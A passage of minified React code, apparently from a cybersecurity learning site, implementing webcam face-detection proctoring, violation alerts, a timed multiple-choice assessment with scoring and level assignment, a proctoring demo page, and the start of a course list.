fetch("/proctor-logs",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(q)})}catch{}},W=q=>{w(se=>se!==q?(c&&c(q),q):se)};v.useEffect(()=>{ae.current=!0;const q=()=>{if(document.hidden){const ve=Date.now();ve-xe.current>ye&&(xe.current=ve,ee("visibility hidden -> violation"),K("window_blur"))}},se=()=>{const ve=Date.now();ve-xe.current>ye&&(xe.current=ve,ee("window blur -> violation"),K("window_blur"))};return document.addEventListener("visibilitychange",q),window.addEventListener("blur",se),()=>{ae.current=!1,document.removeEventListener("visibilitychange",q),window.removeEventListener("blur",se)}},[]),v.useEffect(()=>{},[i,m,f]),v.useEffect(()=>{},[i]);const Q=async()=>{try{if(window.faceapi){U.current=window.faceapi,ee("face-api already present");return}const q=se=>new Promise(ve=>{const Ne=document.createElement("script");Ne.src=se,Ne.async=!0,Ne.onload=()=>{ee(`face-api script loaded from ${se}`),ve()},Ne.onerror=()=>{ee(`face-api script failed to load from ${se}`),ve()},document.body.appendChild(Ne),z.current.faceapi=Ne});if(await q("/libs/face-api.min.js"),window.faceapi||await q("https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"),window.faceapi){const se=window.faceapi;try{if(se.nets&&se.nets.tinyFaceDetector&&se.nets.tinyFaceDetector.isLoaded){ee("face-api models already loaded"),U.current=se;return}ee("Loading face-api models..."),await se.nets.tinyFaceDetector.loadFromUri(`${f}/face-api`),U.current=se,ee("face-api models loaded successfully"),await M({event:"faceapi-loaded"})}catch(ve){ee(`face-api models failed to load: ${String(ve)}`),await M({event:"faceapi-models-missing",error:String(ve)})}}else ee("face-api library not available")}catch(q){ee(`loadFaceApiNow error: ${String(q)}`)}};v.useEffect(()=>{i&&Q()},[i,f]),v.useEffect(()=>{if(!i)return;let q=!1;const se=()=>{const Ne=!!(U.current&&U.current.nets&&U.current.nets.tinyFaceDetector);Ne?(H||(ee("detectorReady => true"),G(!0)),W("ready"),(!O||O==="none")&&Ne&&V("faceapi")):(H&&ee("detectorReady => false"),G(!1))},ve=setInterval(()=>{q||se()},300);return se(),()=>{q=!0,clearInterval(ve)}},[i,f,H,b]),v.useEffect(()=>{const q=p.current||document.createElement("canvas");return p.current=q,q.width=320,q.height=240,q.style.position="absolute",q.style.top="8px",q.style.left="8px",q.style.width="160px",q.style.height="120px",q.style.pointerEvents="none",q.style.zIndex="9999",q.style.display="none",document.body.appendChild(q),()=>{try{q&&q.parentNode&&q.parentNode.removeChild(q)}catch(se){console.debug("overlay removal error",se)}}},[]),v.useEffect(()=>{if(!i||!H)return;const q=x.current||document.createElement("canvas");x.current=q;const se=p.current,ve={current:0},Ne=async Le=>{const kt=Le??performance.now();if(kt-N.current<500){j.current=window.requestAnimationFrame(ge=>{Ne(ge)});return}N.current=kt,ve.current+=1;const rt=ve.current%10===0;if(F.current){j.current=window.requestAnimationFrame(ge=>{Ne(ge)});return}if(rt&&ee(`processFrame start (frame ${ve.current})`),!a.current){rt&&ee("videoRef missing in processFrame"),j.current=window.requestAnimationFrame(ge=>{Ne(ge)});return}const yt=a.current;if(yt.readyState<2){rt&&ee(`video readyState ${yt.readyState} (waiting)`),j.current=window.requestAnimationFrame(ge=>{Ne(ge)});return}rt&&ee(`video dimensions ${yt.videoWidth}x${yt.videoHeight} readyState=${yt.readyState}`),F.current=!0;let be=null;try{q.width=yt.videoWidth||640,q.height=yt.videoHeight||480;const ge=q.getContext("2d");if(!ge){ee("canvas getContext failed");return}ge.drawImage(yt,0,0,q.width,q.height),rt&&ee(`canvas drawn ${q.width}x${q.height}`);let Ae=0;const Oe=[],wt=window.cv;if(!(!qm&&k.current&&wt)){if(!(!qm&&S.current&&S.current.detect))if(U.current&&U.current.nets&&U.current.nets.tinyFaceDetector){rt&&ee("entering face-api branch");try{const Je=U.current,br=await Je.detectAllFaces(q,new Je.TinyFaceDetectorOptions({inputSize:224,scoreThreshold:.5}));Ae=Array.isArray(br)?br.length:0;for(const vr of br){const $r=vr.box||vr.boundingBox||{x:0,y:0,width:0,height:0};Oe.push({x:$r.x,y:$r.y,w:$r.width,h:$r.height})}B.current="faceapi",O!=="faceapi"&&V("faceapi"),rt&&ee(`face-api detected faces=${Ae}`)}catch(Je){console.debug("face-api detect error",Je),ee(`face-api detect error: ${String(Je)}`),await M({event:"faceapi-detect-error",error:String(Je)})}}else ee("No detector available in frame loop")}ee(`Frame detected ${Ae} faces`),Ae===0?(T.current+=1,R.current=0):Ae>1?(R.current+=1,T.current=0):(T.current=0,R.current=0),T.current>=3&&(K("no_face"),T.current=0),R.current>=3&&(K("multiple_faces"),R.current=0);try{const Je=Gj?se.getContext("2d"):null}catch{console.debug("overlay draw error")}}catch(ge){console.error("processing error",ge),await M({event:"processing-error",error:String(ge)})}finally{F.current=!1;try{j.current=window.requestAnimationFrame(ge=>{Ne(ge)})}catch{}}};return j.current=window.requestAnimationFrame(Le=>{Ne(Le)}),()=>{j.current&&(window.cancelAnimationFrame(j.current),j.current=null),F.current=!1}},[i,H,a]);const E=v.useRef(0),I=v.useRef(0),P=5e3;function K(q){E.current+=1;const se=Date.now();n&&n(E.current,q),d&&se-I.current>P&&(d(q,E.current,o),I.current=se),E.current>=o&&(le(),s&&s(),W("ended"))}function le(){try{const q=window.cv;if(k.current&&(k.current=null),q&&q.FS_unlink)try{q.FS_unlink(`/${Hj}`)}catch{}}catch{console.debug("stopProcessing error")}try{const q=z.current.opencv;q&&q.parentNode&&q.parentNode.removeChild(q),z.current.opencv=null}catch{}try{const q=z.current.faceapi;q&&q.parentNode&&q.parentNode.removeChild(q),z.current.faceapi=null}catch{}try{const q=p.current;q&&q.parentNode&&q.parentNode.removeChild(q),p.current=null}catch{}}return v.useEffect(()=>()=>{le(),j.current&&(window.cancelAnimationFrame(j.current),j.current=null)},[]),null},up=({violations:a,threshold:n,lastViolationReason:s,onDismiss:i})=>{const[o,c]=v.useState(!1),[d,m]=v.useState(!1);v.useEffect(()=>{if(a>0&&!d){c(!0);const N=setTimeout(()=>{c(!1)},8e3);return()=>clearTimeout(N)}},[a,d]);const f=()=>{c(!1),m(!0),i&&i()},x=N=>{switch(N){case"no_face":return e.jsx(gs,{className:"h-5 w-5"});case"multiple_faces":return e.jsx(Ut,{className:"h-5 w-5"});case"window_blur":return e.jsx(ly,{className:"h-5 w-5"});default:return e.jsx(or,{className:"h-5 w-5"})}},p=N=>{switch(N){case"no_face":return"Please ensure your face is visible in the camera";case"multiple_faces":return"Only one person should be visible during the exam";case"window_blur":return"Please stay focused on the exam window";default:return"Proctoring violation detected"}},b=()=>a>=n-1?"critical":a>=n-2?"warning":"info",w={critical:"bg-red-50 border-red-200 text-red-800",warning:"bg-yellow-50 border-yellow-200 text-yellow-800",info:"bg-blue-50 border-blue-200 text-blue-800"};if(!o||a===0)return null;const j=b();return e.jsx("div",{className:"fixed top-4 right-4 z-50 max-w-sm",children:e.jsx("div",{className:`rounded-lg border p-4 shadow-lg ${w[j]}`,children:e.jsxs("div",{className:"flex items-start",children:[e.jsx("div",{className:"flex-shrink-0",children:x(s)}),e.jsxs("div",{className:"ml-3 flex-1",children:[e.jsx("h3",{className:"text-sm font-medium",children:"Proctoring Alert"}),e.jsxs("div",{className:"mt-1 text-sm",children:[e.jsx("p",{children:p(s)}),e.jsxs("p",{className:"mt-1 font-medium",children:["Violations: ",a,"/",n,a>=n-1&&e.jsx("span",{className:"ml-2 text-red-600 font-bold",children:"(Final Warning)"})]})]})]}),e.jsx("div",{className:"ml-4 flex-shrink-0",children:e.jsx("button",{onClick:f,className:"inline-flex text-gray-400 hover:text-gray-600 focus:outline-none",children:e.jsx(Co,{className:"h-4 w-4"})})})]})})})},Qj=({isOpen:a,violations:n,threshold:s,violationReasons:i,onClose:o})=>{if(!a)return null;const c=m=>{switch(m){case"no_face":return{title:"Face Not Visible",description:"Your face was not detected in the camera for extended periods",icon:e.jsx(ze,{className:"h-6 w-6 text-red-500"})};case"multiple_faces":return{title:"Multiple People Detected",description:"More than one person was detected in the camera view",icon:e.jsx(or,{className:"h-6 w-6 text-red-500"})};case"window_blur":return{title:"Window Focus Lost",description:"You switched away from the exam window or minimized the browser",icon:e.jsx(Pt,{className:"h-6 w-6 text-red-500"})};default:return{title:"Proctoring Violation",description:"A proctoring rule was violated during the exam",icon:e.jsx(bs,{className:"h-6 w-6 text-red-500"})}}},d=[...new Set(i)];return e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4",children:e.jsx("div",{className:"bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto",children:e.jsxs("div",{className:"p-6",children:[e.jsx("div",{className:"flex items-center justify-between mb-6",children:e.jsxs("div",{className:"flex items-center",children:[e.jsx(bs,{className:"h-8 w-8 text-red-500 mr-3"}),e.jsxs("div",{children:[e.jsx("h2",{className:"text-2xl font-bold text-gray-900",children:"Exam Terminated"}),e.jsx("p",{className:"text-gray-600",children:"Due to proctoring violations"})]})]})}),e.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4 mb-6",children:[e.jsxs("div",{className:"flex items-center mb-2",children:[e.jsx(or,{className:"h-5 w-5 text-red-500 mr-2"}),e.jsx("h3",{className:"text-lg font-semibold text-red-800",children:"Violation Summary"})]}),e.jsxs("p",{className:"text-red-700",children:["Your exam has been terminated due to ",e.jsxs("strong",{children:[n," violation",n!==1?"s":""]})," ","out of the allowed ",s,". This exceeds the maximum number of violations permitted."]})]}),e.jsxs("div",{className:"mb-6",children:[e.jsx("h3",{className:"text-lg font-semibold text-gray-900 mb-4",children:"Violation Details"}),e.jsx("div",{className:"space-y-3",children:d.map((m,f)=>{const x=c(m),p=i.filter(b=>b===m).length;return e.jsxs("div",{className:"flex items-start p-3 bg-gray-50 rounded-lg",children:[e.jsx("div",{className:"flex-shrink-0 mr-3",children:x.icon}),e.jsxs("div",{className:"flex-1",children:[e.jsx("h4",{className:"font-medium text-gray-900",children:x.title}),e.jsx("p",{className:"text-sm text-gray-600 mt-1",children:x.description}),e.jsxs("p",{className:"text-sm text-gray-500 mt-1",children:["Occurred ",p," time",p!==1?"s":""]})]})]},f)})})]}),e.jsxs("div",{className:"bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6",children:[e.jsx("h3",{className:"text-lg font-semibold text-blue-800 mb-2",children:"Important Information"}),e.jsxs("ul",{className:"text-blue-700 space-y-1 text-sm",children:[e.jsx("li",{children:" Your exam responses have been saved up to the point of termination"}),e.jsx("li",{children:" You may be able to retake the exam after a cooling-off period"}),e.jsx("li",{children:" Contact your instructor or administrator if you believe this was an error"}),e.jsx("li",{children:" Ensure proper lighting and camera setup for future attempts"})]})]}),e.jsxs("div",{className:"flex justify-end space-x-3",children:[e.jsx("button",{onClick:o,className:"px-6 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors",children:"Close"}),e.jsx("button",{onClick:()=>window.location.href="/dashboard",className:"px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors",children:"Return to Dashboard"})]})]})})})},Kj=()=>{const[a,n]=v.useState(0),[s,i]=v.useState([]),[o,c]=v.useState(!1),[d,m]=v.useState(1800),[f,x]=v.useState(null),[p,b]=v.useState(new Date),[w,j]=v.useState(null),[N,k]=v.useState(!1),[F,T]=v.useState(""),[R,S]=v.useState(!1),[U,z]=v.useState(null),[H,G]=v.useState(!1),[O,V]=v.useState(""),[B,ae]=v.useState(0),[xe,ye]=v.useState(""),[ne,fe]=v.useState([]),[ie,ee]=v.useState(!1),M=v.useRef(null),{user:W,updateUser:Q}=Ie(),E=Dt[a];v.useEffect(()=>{if(d>0&&!o&&N){const be=setTimeout(()=>m(d-1),1e3);return()=>clearTimeout(be)}else d===0&&N&&q()},[d,o,N]),v.useEffect(()=>{if(!N||o)return;const be=Oe=>{Oe.preventDefault()},ge=Oe=>{Oe.preventDefault()},Ae=Oe=>{(Oe.ctrlKey||Oe.metaKey)&&["c","v","x","s","p"].includes((Oe.key||"").toLowerCase())&&Oe.preventDefault()};return document.addEventListener("contextmenu",be),document.addEventListener("copy",ge),document.addEventListener("cut",ge),document.addEventListener("paste",ge),document.addEventListener("keydown",Ae),()=>{document.removeEventListener("contextmenu",be),document.removeEventListener("copy",ge),document.removeEventListener("cut",ge),document.removeEventListener("paste",ge),document.removeEventListener("keydown",Ae)}},[N,o]),v.useEffect(()=>{M.current&&w&&(M.current.srcObject=w)},[w]),v.useEffect(()=>()=>{w&&w.getTracks().forEach(be=>be.stop())},[w]);const I=async()=>{S(!0),T("");try{const be=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720},facingMode:"user"},audio:!0});if(j(be),k(!0),S(!1),W?.id&&!U)try{const ge=await zm.startAttempt(W.id,"initial");z(ge.id)}catch(ge){console.error(ge),T("Could not start assessment attempt. Please retry.")}}catch(be){S(!1),be instanceof Error&&(be.name==="NotAllowedError"?T("Camera and microphone access denied. Please allow access to continue with the assessment."):be.name==="NotFoundError"?T("No camera or microphone found. Please ensure your devices are connected."):T("Failed to access camera and microphone. Please check your device settings."))}},P=be=>{x(be)},K=()=>{if(f!==null){rt();const be=[...s];be[a]=f,i(be),a<Dt.length-1?(n(a+1),x(s[a+1]??null),b(new Date)):q(be)}},le=()=>{if(a>0){const be=[...s];f!==null&&(be[a]=f,i(be)),n(a-1),x(s[a-1]??null)}},q=async(be=s)=>{f!==null&&rt(),G(!0),V("");try{const ge=Le(be),Ae=kt(ge);let Oe;if(U){const wt=await zm.getAttemptResults(U);Oe=await qj.analyzeAssessment(wt)}if(W?.id?(await Z.from("users").update({level:Ae,completed_assessment:!0}).eq("id",W.id),Q({completedAssessment:!0,level:Ae})):Q({completedAssessment:!0,level:Ae}),W?.id&&Oe)try{const wt=await lt.getAllCourses(),Je=Array.isArray(wt)&&wt.length>0?wt[0].id:null;Je&&await pd.allocateInitialPath(W.id,Je,Oe)}catch(wt){console.error("Failed to allocate initial path from DB:",wt)}c(!0)}catch(ge){console.error("Submit test failed:",ge);const Ae=ge instanceof Error?ge.message:"Submission failed.";V(Ae),c(!0)}finally{G(!1)}},se=(be,ge)=>{ae(be),ye(ge),fe(Ae=>[...Ae,ge]),console.warn("Proctor violation",be,ge)},ve=(be,ge,Ae)=>{ye(be),console.log(`Violation warning: ${be} (${ge}/${Ae})`)},Ne=()=>{ee(!0),w&&(w.getTracks().forEach(be=>be.stop()),j(null)),q()},Le=be=>{let ge=0;return Dt.forEach((Ae,Oe)=>{be[Oe]===Ae.correctAnswer&&ge++}),Math.round(ge/Dt.length*100)},kt=be=>be<30?"beginner":be<60?"intermediate":"advanced",rt=async()=>{if(!(!W||f===null))try{const be=Math.floor((new Date().getTime()-p.getTime())/1e3),ge=f===E.correctAnswer;await Z.from("assessment_responses").insert({attempt_id:U??void 0,user_id:W.id,question_id:E.id,selected_answer:f,is_correct:ge,time_taken_seconds:be,context:"initial"})}catch(be){console.error("Failed to save assessment response:",be)}},yt=be=>{const ge=Math.floor(be/60),Ae=be%60;return`${ge}:${Ae.toString().padStart(2,"0")}`};if(!N)return e.jsx("div",{className:"p-6",children:e.jsx("div",{className:"max-w-3xl mx-auto",children:e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-8 text-center",children:[e.jsxs("div",{className:"mb-6",children:[e.jsx(Cd,{className:"h-16 w-16 text-cyan-600 mx-auto mb-4"}),e.jsx("h2",{className:"text-2xl font-bold text-gray-900 mb-4",children:"Camera and Microphone Access Required"}),e.jsx("p",{className:"text-gray-600 mb-6",children:"To ensure the integrity of the assessment, we require access to your camera and microphone during the test. This helps us maintain a secure testing environment."})]}),F&&e.jsx("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4 mb-6",children:e.jsx("p",{className:"text-red-700 font-medium",children:F})}),e.jsxs("div",{className:"bg-cyan-50 border border-cyan-200 rounded-lg p-6 mb-6 text-left",children:[e.jsx("h3",{className:"font-bold text-cyan-900 mb-3",children:"What we monitor:"}),e.jsxs("div",{className:"space-y-2 text-cyan-800",children:[e.jsxs("div",{className:"flex items-start space-x-3",children:[e.jsx(Nm,{className:"h-5 w-5 mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Your video feed to ensure you remain present during the assessment"})]}),e.jsxs("div",{className:"flex items-start space-x-3",children:[e.jsx(ld,{className:"h-5 w-5 mt-0.5 flex-shrink-0"}),e.jsx("span",{children:"Audio monitoring to maintain test security"})]})]})]}),e.jsx("div",{className:"bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6",children:e.jsxs("p",{className:"text-blue-800 text-sm",children:[e.jsx("strong",{children:"Privacy Notice:"})," Your video and audio are monitored in real-time but are not recorded or stored. This monitoring is solely for maintaining assessment integrity."]})}),e.jsx("button",{onClick:I,disabled:R,className:"bg-cyan-600 text-white px-8 py-3 rounded-lg hover:bg-cyan-700 transition-colors text-lg font-medium disabled:opacity-50 disabled:cursor-not-allowed",children:R?"Requesting Access...":"Grant Camera & Microphone Access"})]})})});if(W?.completedAssessment&&!o)return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800",children:e.jsx("div",{className:"max-w-2xl mx-auto text-center",children:e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/20 p-8",children:[e.jsx(Pe,{className:"h-16 w-16 text-[#00FF88] mx-auto mb-4"}),e.jsx("h2",{className:"text-2xl font-bold text-white mb-4",children:"Assessment Already Completed"}),e.jsx("p",{className:"text-[#00B37A] mb-2",children:"You have already completed the assessment test."}),e.jsxs("p",{className:"text-[#EAEAEA] mb-6",children:["Your current level: ",e.jsx("span",{className:"font-bold text-[#00FF88] uppercase",children:W.level})]}),e.jsxs("div",{className:"flex flex-col sm:flex-row gap-4 justify-center",children:[e.jsxs("button",{onClick:()=>{window.dispatchEvent(new CustomEvent("navigateToTab",{detail:{tab:"courses"}}))},className:"bg-[#00FF88] text-black px-6 py-3 rounded-lg font-bold hover:bg-[#00CC66] transition-colors flex items-center justify-center space-x-2",children:[e.jsx("span",{children:"Continue Learning"}),e.jsx(Or,{className:"h-5 w-5"})]}),e.jsx("button",{onClick:()=>{window.dispatchEvent(new CustomEvent("navigateToTab",{detail:{tab:"dashboard"}}))},className:"border border-[#00FF88]/30 text-[#00FF88] px-6 py-3 rounded-lg hover:bg-[#00FF88]/10 transition-colors",children:"Go to Dashboard"})]})]})})});if(o){const be=Le(s),ge=kt(be);return e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"max-w-4xl mx-auto",children:[e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-8 text-center mb-8",children:[e.jsx("div",{className:"mb-6",children:be>=85?e.jsx(Pe,{className:"h-16 w-16 text-green-500 mx-auto"}):be>=65?e.jsx(zv,{className:"h-16 w-16 text-yellow-500 mx-auto"}):e.jsx(bs,{className:"h-16 w-16 text-red-500 mx-auto"})}),e.jsx("h2",{className:"text-3xl font-bold text-gray-900 mb-4",children:"Assessment Complete!"}),e.jsxs("div",{className:"text-6xl font-bold text-cyan-600 mb-2",children:[be,"%"]}),e.jsxs("p",{className:"text-xl text-gray-600 mb-6",children:["Your cybersecurity level: ",e.jsx("span",{className:"font-bold capitalize text-cyan-600",children:ge})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4 mb-8",children:[e.jsxs("div",{className:"bg-gray-50 p-4 rounded-lg",children:[e.jsx("div",{className:"text-2xl font-bold text-gray-900",children:s.filter((Ae,Oe)=>Ae===Dt[Oe].correctAnswer).length}),e.jsx("div",{className:"text-gray-600",children:"Correct Answers"})]}),e.jsxs("div",{className:"bg-gray-50 p-4 rounded-lg",children:[e.jsx("div",{className:"text-2xl font-bold text-gray-900",children:Dt.length-s.filter((Ae,Oe)=>Ae===Dt[Oe].correctAnswer).length}),e.jsx("div",{className:"text-gray-600",children:"Incorrect Answers"})]}),e.jsxs("div",{className:"bg-gray-50 p-4 rounded-lg",children:[e.jsx("div",{className:"text-2xl font-bold text-gray-900",children:Dt.length}),e.jsx("div",{className:"text-gray-600",children:"Total Questions"})]})]}),e.jsxs("div",{className:"bg-cyan-50 border border-cyan-200 rounded-lg p-4 mb-6",children:[e.jsx("h3",{className:"font-bold text-cyan-800 mb-2",children:"What's Next?"}),e.jsx("p",{className:"text-cyan-700",children:"Based on your performance, we've unlocked the appropriate OWASP Top 10 course for your level. Start learning with hands-on labs and practical exercises!"})]}),O&&e.jsx("div",{className:"bg-red-50 border border-red-200 rounded-lg p-3 mb-6 text-red-700",children:O}),e.jsxs("div",{className:"flex flex-col sm:flex-row gap-4 justify-center",children:[e.jsxs("button",{onClick:()=>{window.dispatchEvent(new CustomEvent("navigateToTab",{detail:{tab:"courses"}})),window.location.reload()},disabled:H,className:"bg-cyan-600 text-white px-8 py-3 rounded-lg hover:bg-cyan-700 transition-colors text-lg font-medium disabled:opacity-50 flex items-center justify-center space-x-2",children:[e.jsx("span",{children:H?"Finalizing":"Start Learning"}),e.jsx(Or,{className:"h-5 w-5"})]}),e.jsx("button",{onClick:()=>window.location.reload(),disabled:H,className:"border border-gray-300 text-gray-700 px-8 py-3 rounded-lg hover:bg-gray-50 transition-colors text-lg font-medium disabled:opacity-50",children:"Go to Dashboard"})]})]}),e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-xl font-bold text-gray-900 mb-6",children:"Detailed Results"}),e.jsx("div",{className:"space-y-4",children:Dt.map((Ae,Oe)=>{const wt=s[Oe],Je=wt===Ae.correctAnswer;return e.jsx("div",{className:`border rounded-lg p-4 ${Je?"border-green-200 bg-green-50":"border-red-200 bg-red-50"}`,children:e.jsxs("div",{className:"flex items-start space-x-3",children:[Je?e.jsx(Pe,{className:"h-5 w-5 text-green-500 mt-0.5"}):e.jsx(bs,{className:"h-5 w-5 text-red-500 mt-0.5"}),e.jsxs("div",{className:"flex-1",children:[e.jsx("p",{className:"font-medium text-gray-900 mb-2",children:Ae.question}),e.jsxs("p",{className:"text-sm text-gray-600 mb-2",children:[e.jsx("span",{className:"font-medium",children:"Your answer:"})," ",Ae.options[wt]]}),!Je&&e.jsxs("p",{className:"text-sm text-gray-600 mb-2",children:[e.jsx("span",{className:"font-medium",children:"Correct answer:"})," ",Ae.options[Ae.correctAnswer]]}),e.jsx("p",{className:"text-sm text-gray-700",children:Ae.explanation})]})]})},Ae.id)})})]})]})})}return e.jsxs("div",{className:"p-6",children:[e.jsx(up,{violations:B,threshold:3,lastViolationReason:xe}),e.jsx(Qj,{isOpen:ie,violations:B,threshold:3,violationReasons:ne,onClose:()=>ee(!1)}),e.jsx("div",{className:"max-w-6xl mx-auto",children:e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsx("div",{className:"lg:col-span-1",children:e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-4 sticky top-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-3",children:[e.jsx("h3",{className:"text-sm font-semibold text-gray-900",children:"Video Monitoring"}),e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx("div",{className:"w-2 h-2 bg-red-500 rounded-full animate-pulse"}),e.jsx("span",{className:"text-xs text-red-600 font-medium",children:"LIVE"})]})]}),e.jsxs("div",{className:"relative bg-gray-900 rounded-lg overflow-hidden aspect-video mb-3",children:[e.jsx("video",{ref:M,autoPlay:!0,playsInline:!0,muted:!0,className:"w-full h-full object-cover mirror"}),e.jsx("div",{className:"absolute top-2 left-2",children:e.jsx(dp,{videoRef:M,mediaStream:w,onViolation:se,onEndExam:Ne,onViolationWarning:ve,threshold:3})}),e.jsxs("div",{className:"absolute bottom-2 right-2 flex items-center space-x-2",children:[e.jsx("div",{className:"bg-black bg-opacity-60 rounded-full p-1.5",children:e.jsx(Nm,{className:"h-3 w-3 text-white"})}),e.jsx("div",{className:"bg-black bg-opacity-60 rounded-full p-1.5",children:e.jsx(ld,{className:"h-3 w-3 text-white"})})]})]}),e.jsx("div",{className:"bg-blue-50 border border-blue-200 rounded-lg p-3",children:e.jsx("p",{className:"text-xs text-blue-800",children:"Your camera and microphone are active for proctoring purposes. Please remain visible throughout the assessment."})})]})}),e.jsxs("div",{className:"lg:col-span-2",children:[e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-6 mb-6",children:[e.jsxs("div",{className:"flex justify-between items-center",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Cybersecurity Assessment"}),e.jsxs("p",{className:"text-gray-600",children:["Question ",a+1," of ",Dt.length]})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-lg font-medium",children:[e.jsx(Pt,{className:"h-5 w-5 text-gray-500"}),e.jsx("span",{className:d<300?"text-red-600":"text-gray-900",children:yt(d)})]})]}),e.jsx("div",{className:"mt-4",children:e.jsx("div",{className:"w-full bg-gray-200 rounded-full h-2",children:e.jsx("div",{className:"bg-cyan-600 h-2 rounded-full transition-all duration-300",style:{width:`${(a+1)/Dt.length*100}%`}})})})]}),e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-8",children:[e.jsxs("div",{className:"mb-6",children:[e.jsx("div",{className:"flex items-center space-x-2 mb-4",children:e.jsx("span",{className:`px-2 py-1 rounded text-xs font-medium ${E.difficulty==="easy"?"bg-green-100 text-green-800":E.difficulty==="medium"?"bg-yellow-100 text-yellow-800":"bg-red-100 text-red-800"}`,children:E.difficulty.toUpperCase()})}),e.jsx("h2",{className:"text-xl font-bold text-gray-900 mb-6",children:E.question})]}),e.jsx("div",{className:"space-y-3 mb-8",children:E.options.map((be,ge)=>e.jsx("button",{onClick:()=>P(ge),className:`w-full text-left p-4 rounded-lg border-2 transition-all ${f===ge?"border-cyan-500 bg-cyan-50 text-cyan-900":"border-gray-200 hover:border-gray-300 bg-white"}`,children:e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:`w-4 h-4 rounded-full border-2 ${f===ge?"border-cyan-500 bg-cyan-500":"border-gray-300"}`,children:f===ge&&e.jsx("div",{className:"w-full h-full rounded-full bg-white scale-50"})}),e.jsx("span",{className:"text-gray-900",children:be})]})},ge))}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("button",{onClick:le,disabled:a===0,className:"px-6 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed transition-colors",children:"Previous"}),e.jsx("button",{onClick:()=>a===Dt.length-1?q():K(),disabled:f===null,className:"px-6 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors",children:a===Dt.length-1?"Submit Test":"Next Question"})]})]})]})]})})]})},Yj=()=>{const a=v.useRef(null),[n,s]=v.useState(null),[i,o]=v.useState([]),[c,d]=v.useState(!1),[m,f]=v.useState(0),[x,p]=v.useState(""),b=T=>o(R=>[new Date().toLocaleTimeString()+" - "+T,...R].slice(0,200)),w=async T=>{try{await fetch("/proctor-logs",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(T)})}catch{}},j=async()=>{try{const T=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:!1});s(T),a.current&&(a.current.srcObject=T),d(!0),b("Media started"),w({event:"media-started",time:new Date().toISOString()})}catch(T){b("Media start failed: "+(T instanceof Error?T.message:String(T)))}},N=()=>{n&&n.getTracks().forEach(T=>T.stop()),s(null),d(!1),f(0),p(""),b("Media stopped"),w({event:"media-stopped",time:new Date().toISOString()})},k=(T,R)=>{f(T),p(R),b(`Violation ${T}: ${R}`)},F=(T,R,S)=>{p(T),b(`Warning: ${T} (${R}/${S})`)};return e.jsxs("div",{className:"p-6",children:[e.jsx(up,{violations:m,threshold:3,lastViolationReason:x}),e.jsxs("div",{className:"max-w-4xl mx-auto",children:[e.jsx("h2",{className:"text-2xl font-bold mb-4",children:"Proctoring Demo"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("div",{className:"relative bg-black rounded overflow-hidden aspect-video",children:e.jsx("video",{ref:a,autoPlay:!0,playsInline:!0,muted:!0,className:"w-full h-full object-cover"})}),e.jsx("div",{className:"mt-3 flex space-x-2",children:c?e.jsx("button",{onClick:N,className:"px-4 py-2 bg-red-600 text-white rounded",children:"Stop Camera"}):e.jsx("button",{onClick:j,className:"px-4 py-2 bg-cyan-600 text-white rounded",children:"Start Camera"})})]}),e.jsxs("div",{children:[e.jsxs("div",{className:"bg-white p-4 rounded shadow",children:[e.jsx("h3",{className:"font-semibold mb-2",children:"Proctoring"}),e.jsx(dp,{videoRef:a,mediaStream:n,enabled:c,onViolation:k,onEndExam:()=>b("End exam triggered"),onStatusChange:T=>b("Status: "+T),onViolationWarning:F,threshold:3})]}),e.jsxs("div",{className:"bg-white p-4 rounded shadow mt-4",children:[e.jsx("h3",{className:"font-semibold mb-2",children:"Logs"}),e.jsx("div",{style:{maxHeight:320,overflow:"auto"},children:i.map((T,R)=>e.jsx("div",{className:"text-xs font-mono text-gray-700",children:T},R))})]})]})]})]})]})},Jj=({onCourseSelect:a})=>{const{user:n}=Ie(),[s,i]=v.useState([]),[o,c]=v.useState(!1),m=(x=>{switch(x){case"beginner":return 3;case"intermediate":return 7;case"advanced":return Number.POSITIVE_INFINITY;default:return 0}})(n?.level),f=!!n?.completedAssessment||n?.role==="admin";return v.useEffect(()=>{let x=!0;return(async()=>{c(!0);try{const b=await lt.getAllCourses();x&&Array.isArray(b)&&i(b)}catch(b){console.error("Failed to load courses:",b)}finally{x&&c(!1)}})(),()=>{x=!1}},[]),e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-6xl 